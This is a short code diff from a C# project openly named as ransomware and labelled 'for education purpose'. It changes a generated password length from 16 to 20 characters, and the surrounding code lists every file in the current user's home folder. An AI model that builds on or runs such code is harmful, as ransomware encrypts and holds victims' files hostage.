@@ -17,7 +17,7 @@ namespace Ransomeware
         //.NET FRAMEWORK 4.0
         //FOR EDUCATION PURPOSE.
         //NOTE: I didn't try this ransomeware but i think it works perfectly, try it on a virtual machine and tell me if you face any problem in issues.
-        string password = GeneratePassword(16);
+        string password = GeneratePassword(20);
         private void Form1_Load(object sender, EventArgs e)
         {
             var directory = Directory.GetFiles(@"C:\Users\" + Environment.UserName);
